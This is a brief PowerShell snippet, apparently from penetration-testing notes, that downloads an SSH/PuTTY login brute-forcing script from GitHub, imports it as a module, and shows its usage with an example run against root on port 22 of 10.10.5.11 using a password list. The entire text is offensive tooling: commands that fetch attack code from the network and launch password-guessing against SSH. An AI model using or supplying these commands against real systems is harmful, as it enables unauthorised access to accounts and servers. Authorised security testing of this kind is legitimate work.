Invoke-WebRequest -Uri "https://raw.githubusercontent.com/InfosecMatter/SSH-PuTTY-login-bruteforcer/master/ssh-putty-brute.ps1" -OutFile "ssh-putty-brute.ps1"
import-module .\ssh-putty-brute.ps1

#Usage
ssh-putty-brute [-h ip|ips.txt] [-p port] [-u user|users.txt] [-pw pass|pwdlist.txt]
#ex
ssh-putty-brute -h 10.10.5.11 -p 22 -u root -pw (Get-Content .\pwdlist.txt)
